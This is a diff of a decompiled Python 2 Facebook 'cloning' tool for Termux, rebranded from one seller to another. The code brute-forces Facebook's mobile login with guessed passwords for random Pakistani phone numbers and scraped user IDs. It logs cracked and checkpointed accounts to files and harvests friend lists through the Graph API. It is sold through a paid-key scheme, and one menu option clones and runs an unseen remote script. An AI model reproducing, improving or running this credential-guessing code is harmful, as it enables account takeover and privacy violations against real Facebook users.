@@ -1,5 +1,3 @@
-# Decompile by : Hamid Meer'hamii 
-# Time Succes decompile : 2022-03-26 18:16:47.173597
 # Source Generated with Decompyle++
 # File: out.pyc (Python 2.7)
 
@@ -42,7 +40,7 @@ try:
 except:
     os.system('pip2 install lolcat')
 
-logo = "'\x1b[1;92m'  _____ ___  ___ _____  _____   ___   ______\n'\x1b[1;92m' |_   _||  \\/  ||_   _||_   _| / _ \\ |___  /\n'\x1b[1;91m'   | |  | .  . |  | |    | |  / /_\\ \\   / / \n'\x1b[1;97m'   | |  | |\\/| |  | |    | |  |  _  |  / /  \n'\x1b[1;93m'  _| |_ | |  | |  | |   _| |_ | | | |./ /___\n'\x1b[1;94m'  \\___/ \\_|  |_/  \\_/   \\___/ \\_| |_/\\_____/ \n\n'\x1b[1;91m'   Author      :     IMTIAZ KING     \n'\x1b[1;92m'   Github      :     AKING110  \n'\x1b[1;93m'   FB ID       :     IMTIAZ KING\n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;96m'   WAP NUMBER  :     03237528063            \n"
+logo = "'\x1b[1;92m' \n    ########     ###          ##    ###    \n    ##     ##   ## ##         ##   ## ##   \n    ##     ##  ##   ##        ##  ##   ##  \n    ########  ##     ##       ## ##     ## \n    ##   ##   ######### ##    ## ######### \n    ##    ##  ##     ## ##    ## ##     ## \n    ##     ## ##     ##  ######  ##     ##\n\n\n'\x1b[1;91m'   Author      :     RAEES RAJA KHASKHELI   \n'\x1b[1;92m'   Github      :     KHASKHELI786 \n'\x1b[1;92m'   KING OF     :     KHASKHELI\n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WAP NUMBER  :     03022536182           \n"
 dec = '2'
 server = '2'
 rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
@@ -63,60 +61,46 @@ oks = []
 cps = []
 
 def main_apv():
-    imt = '+IMTIAZ=='
+    imt = '~~RAJA=='
     os.system('clear')
     print logo
     
     try:
-        key1 = open('/sdcard/.android.txt', 'r').read()
+        key1 = open('/sdcard/Music/.2.txt', 'r').read()
     except IOError:
         os.system('clear')
         print logo
-        print '           You dont have subscrption'
-        print '           Hello Dear Ya Cammonds Paid Han Or'
-        print '           Ap Ke Subscription Nhi Ha Please Ap'
-        print '           Admin Sa Rabta Kran Thanks'
-        print '           Subscription Kelya Enter Press Kro'
-        print '           Or Whatsapp Pa Rabta Kro Thanks'
+        print 40 * '-'
+        print '           YOUR KEY IS NOT APPROVEL '
+        print 40 * '-'
         print ''
-        myid = uuid.uuid4().hex[:10]
-        print '         YOUR KEY : ' + myid + imt
-        kok = open('/sdcard/.android.txt', 'w')
+        print '           THIS IS YOUR KEY BRO'
+        print ''
+        myid = uuid.uuid4().hex[:20]
+        print '          YOUR KEY : ' + myid + imt
+        kok = open('/sdcard/Music/.2.txt', 'w')
         kok.write(myid + imt)
         kok.close()
         print ''
-        print '           Ya Uper Wale Ap Ke KEY Ha'
-        print '           Copy Kar Ka WhatsApp Pa Bhaj Dena'
         print ''
-        print ''
-        print ''
-        print '     Agar Ap Na Subscription Kar Le Ha To'
-        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
-        os.system('xdg-open https://wa.me/+923237528063')
+        raw_input('      Copy Key And Press Enter For Approvel Your Key ')
+        os.system('xdg-open https://wa.me/+923022536182')
 
-    r1 = requests.get('https://raw.githubusercontent.com/Aradinhacker/new/main/imt.txt').text
+    r1 = requests.get('https://raw.githubusercontent.com/MuhammadRaja786/Raja/main/Raja.txt').text
     if key1 in r1:
         main_system()
     else:
         os.system('clear')
         print logo
-        print '           You dont have subscrption'
-        print '           Hello Dear Ya Cammonds Paid Han Or'
-        print '           Ap Ke Subscription Nhi Ha Please Ap'
-        print '           Admin Sa Rabta Kran Thanks'
-        print '           Subscription Kelya Enter Press Kro'
-        print '           Or Whatsapp Pa Rabta Kro Thanks'
+        print 40 * '-'
+        print '          YOUR KEY IS NOT APPROVEL '
+        print 40 * '-'
+        print '          THIS IS YOUR KEY BRO'
         print ''
-        print '         YOUR KEY : ' + key1
+        print '          YOUR KEY : ' + key1
         print ''
-        print '           Ya Uper Wale Ap Ke KEY Ha'
-        print '           Copy Kar Ka WhatsApp Pa Bhaj Dena'
-        print ''
-        print ''
-        print ''
-        print '     Agar Ap Na Subscription Kar Le Ha To'
-        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
-        os.system('xdg-open https://wa.me/+923237528063')
+        raw_input('      Copy Key And Press Enter For Approvel Your Key ')
+        os.system('xdg-open https://wa.me/+923022536182')
 
 
 def main_system():
@@ -145,15 +129,16 @@ def main_system():
     print logo
     print ''
     print 39 * '~'
-    print '\x1b[1;93m[1]   Public Cloning      \x1b[1;92m(Login)'
-    print '\x1b[1;91m[2]   Random Cloning     \x1b[1;92m (No Login)'
-    print '\x1b[1;92m[3]   File Cloning       \x1b[1;92m (No Login)'
-    print '\x1b[1;93m[4]   File Making Menu\x1b[1;92m    (Login)'
-    print '\x1b[1;94m[5]   Check Subscription '
-    print '\x1b[1;95m[6]   Update Tools'
-    print '\x1b[1;96m[7]   For Any Help Massage WhatsApp'
+    print '\x1b[1;92m[1]   James Cloning      \x1b[1;92m (Bypass)'
+    print '\x1b[1;92m[2]   Public Cloning      \x1b[1;92m(Login)'
+    print '\x1b[1;91m[3]   Random Cloning     \x1b[1;92m (No Login)'
+    print '\x1b[1;92m[4]   File Cloning       \x1b[1;92m (No Login)'
+    print '\x1b[1;92m[5]   File Making Menu\x1b[1;92m    (V I P)'
+    print '\x1b[1;94m[6]   Check Subscription '
+    print '\x1b[1;95m[7]   Update Tools'
+    print '\x1b[1;96m[8]   For Any Help Massage WhatsApp'
     print 43 * '~'
-    print '\x1b[1;92m[*]\x1b[1;95m For Need Any Help Type 7 And \x1b[1;92mWhatsApp Me  '
+    print '\x1b[1;92m[*]\x1b[1;95m For Need Any Help Type 8 And \x1b[1;92mWhatsApp Me  '
     print 43 * '~'
     main_input()
 
@@ -161,44 +146,42 @@ def main_system():
 def main_input():
     mx = raw_input('\x1b[1;92m[*] Select :\x1b[1;93m ')
     if mx == '1':
+        os.system('clear')
+        os.system('git clone https://github.com/OpKing786/OP_KING')
+        os.system('cd OP_KING && python Prohack.py')
+    if mx == '2':
         print ''
         print '\x1b[1;94m Cheking Subscription ....\x1b[1;92m'
         time.sleep(3)
         fb_menu()
-    elif mx == '2':
+    elif mx == '3':
         print ''
         print '\x1b[1;94m Cheking Subscription ....\x1b[1;97m'
         time.sleep(3)
         numcloning()
-    elif mx == '3':
+    elif mx == '4':
+        print ''
+        os.system('clear')
+        print ''
+        print logo
+        print ''
+        print '      [ File Cloning ]'
         print ''
         print ''
-        print ''
-        print ''
-        print '        [ File Cloning ]'
-        print ''
-        print '    [ Clone With Auto 1 Pass Speed ]'
-        print ''
-        print '    [1] Cloning With 1 Pass'
-        print '    [2] Cloning With Auto Pass'
-        print '    [3] Cloning With Name + Pass'
+        print '    [1] Start Cloning'
         print '    [0] Back'
         print ''
         c = raw_input('   [*] Select : ')
-        if c == '2':
+        if c == '1':
             fileauto()
-        elif c == '3':
-            n_f_p_pass()
-        elif c == '1':
-            c_f_p_pass()
         else:
             main_system()
-    elif mx == '4':
+    elif mx == '5':
         print ''
         print '\x1b[1;94m Cheking Subscription ....\x1b[1;97m'
         time.sleep(3)
         grap()
-    elif mx == '5':
+    elif mx == '6':
         os.system('clear')
         print logo
         print ''
@@ -206,13 +189,13 @@ def main_input():
         print ''
         print ''
         print '\x1b[1;92m        Congratulations Bro Your Pro'
-        print '\x1b[1;92m        Member In Imtiaz Paid Commands '
+        print '\x1b[1;92m        Member In khaskheli Paid Commands '
         print '\x1b[1;91m        ENJOY  KRO BHI LOGO '
         time.sleep(3.5)
         main_system()
-    elif mx == '6':
-        os.system('rm -rf PAID')
+    elif mx == '7':
         os.system('git clone https://github.com/AKING110/PAID')
+        os.system('rm -rf PAID')
         os.system('cp -f PAID/PAID \\.')
         os.system('rm -rf PAID')
         os.system(' cd PAID')
@@ -221,8 +204,8 @@ def main_input():
         xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
         time.sleep(2)
         main_system()
-    elif mx == '7':
-        os.system('xdg-open https://wa.me/+923237528063')
+    elif mx == '8':
+        os.system('xdg-open https://wa.me/+923022536182')
         time.sleep(3)
         main_system()
     else:
@@ -241,10 +224,10 @@ def numcloning():
     os.system('clear')
     print logo
     print ''
-    print '    \x1b[1;91m\n    [ Pakistan Random Number Cloning ]'
+    print '    \x1b[1;91m\n[ Pakistan Random Number Cloning ]'
     print ''
     print '\x1b[1;92m\n   [*] Enter First 4 Latter Of Any Network : '
-    print '\x1b[1;93m\n     Example 0300  0345 0320 0303 '
+    print '\x1b[1;93m\n     Example 0300 0345 0320 0303 0310  '
     print ''
     coc = raw_input('\x1b[1;95m\nChoice Code :\x1b[1;93m ')
     
@@ -287,21 +270,21 @@ def numcloning():
                 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
             p = rana.get('https://mbasic.facebook.com')
             b = rana.post('https://mbasic.facebook.com/login.php', data = {
-                'email': coc + user,
+                'email': uid + user,
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + coc + user + ' | ' + pass1
-                ok = open('imtiaz random-ok.txt', 'a')
-                ok.write(cid + ' | ' + pass1 + '\n')
+                print '\x1b[1;92m[RAJA-OK] ' + coc + user + ' | ' + pass1
+                ok = open('random-ok.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
-                oks.append(cid + pass1)
+                oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + coc + user + ' | ' + pass1
+                print '\x1b[1;91m[RAJA-CP] ' + coc + user + ' | ' + pass1
                 cp = open('imtiaz random-cp.txt', 'a')
-                cp.write(cid + ' | ' + pass1 + '\n')
+                cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
-                cps.append(cid + pass1)
+                cps.append(uid + pass1)
         except:
             pass
 
@@ -312,8 +295,8 @@ def numcloning():
     print 40 * '-'
     print '[!] Cloning Complete Been Completed ........'
     print 40 * '-'
-    print '[!] Total Ok Ids : ' + str(len(cps))
-    print '[!] Total Cp Ids : ' + str(len(oks))
+    print '[!] Total Ok Ids : ' + str(len(oks))
+    print '[!] Total Cp Ids : ' + str(len(cps))
     print 40 * '-'
     print ''
     raw_input(' Press Enter To Back ')
@@ -499,7 +482,7 @@ def mineExt():
     file = open('kk.txt')
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -512,7 +495,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -525,7 +508,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -538,7 +521,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From RAJA : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -551,7 +534,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -564,7 +547,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -577,7 +560,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -590,7 +573,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -603,7 +586,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -616,7 +599,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -629,7 +612,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -642,7 +625,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -655,7 +638,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -668,7 +651,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -681,7 +664,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From zRaja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -694,7 +677,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -707,7 +690,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -720,7 +703,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -733,7 +716,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -746,7 +729,7 @@ def mineExt():
     fuck.close()
     my_line = file.readline()
     count.append(my_line)
-    print g + '[=] Extracting From IMTIAZ : ' + my_line[:15]
+    print g + '[=] Extracting From Raja : ' + my_line[:15]
     r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
     z = json.loads(r.text)
     fuck = open('jok.txt', 'a')
@@ -1129,14 +1112,14 @@ def xokpauto():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[IRAJA-OK] ' + uid + ' | ' + pass1
+                ok = open('RAJA-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass1
+                cp = open('RAJA-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -1158,14 +1141,14 @@ def xokpauto():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass2
+                    ok = open('RAJA-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass2
+                    cp = open('RAJA-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -1187,14 +1170,14 @@ def xokpauto():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass3
+                        ok = open('RAJA-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass3
+                        cp = open('RAJA-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -1216,14 +1199,14 @@ def xokpauto():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass4
+                            ok = open('RAJA-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[IRAJA-CP] ' + uid + ' | ' + pass4
+                            cp = open('RAJA-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -1245,14 +1228,14 @@ def xokpauto():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass5
+                                ok = open('RAJA-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass5
+                                cp = open('RAJA-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -1640,14 +1623,14 @@ def xokp():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass1
+                ok = open('RAJA-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass1
+                cp = open('RAJA-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -1669,14 +1652,14 @@ def xokp():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass2
+                    ok = open('RAJA-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass2
+                    cp = open('RAJA-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -1698,14 +1681,14 @@ def xokp():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass3
+                        ok = open('RAJA-ok.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'checkpoint' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass3
-                        cp = open('IMTIAZ-cp.txt', 'a')
+                        print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass3
+                        cp = open('RAJA-cp.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -1727,14 +1710,14 @@ def xokp():
                             'pass': pass4,
                             'login': 'submit' })
                         if 'c_user' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass4
-                            ok = open('IMTIAZ-ok.txt', 'a')
+                            print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass4
+                            ok = open('Raja-ok.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'checkpoint' in rana.cookies.get_dict().keys():
-                            print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass4
-                            cp = open('IMTIAZ-cp.txt', 'a')
+                            print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass4
+                            cp = open('Raja-cp.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.append(uid + pass4)
@@ -1756,14 +1739,14 @@ def xokp():
                                 'pass': pass5,
                                 'login': 'submit' })
                             if 'c_user' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass5
-                                ok = open('IMTIAZ-ok.txt', 'a')
+                                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass5
+                                ok = open('Raja-ok.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass5
-                                cp = open('IMTIAZ-cp.txt', 'a')
+                                print '\x1b[1;91m[IRaja-CP] ' + uid + ' | ' + pass5
+                                cp = open('Raja-cp.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.append(uid + pass5)
@@ -2151,14 +2134,14 @@ def xokp():
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass1
+                ok = open('Raja-ok.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass1
+                cp = open('Raja-cp.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -2180,14 +2163,14 @@ def xokp():
                     'pass': pass2,
                     'login': 'submit' })
                 if 'c_user' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass2
-                    ok = open('IMTIAZ-ok.txt', 'a')
+                    print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass2
+                    ok = open('Raja-ok.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'checkpoint' in rana.cookies.get_dict().keys():
-                    print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass2
-                    cp = open('IMTIAZ-cp.txt', 'a')
+                    print '\x1b[1;91m[Raja-CP] ' + uid + ' | ' + pass2
+                    cp = open('Raja-cp.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -2209,14 +2192,14 @@ def xokp():
                         'pass': pass3,
                         'login': 'submit' })
                     if 'c_user' in rana.cookies.get_dict().keys():
-                        print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass3
-                        ok = open('IMTIAZ-ok.txt', 'a')
+                        print '\x1b[1;92m[Raja-OK] ' + uid + ' | ' + pass3
+                        ok = open('Raja-ok.txt', 'a')
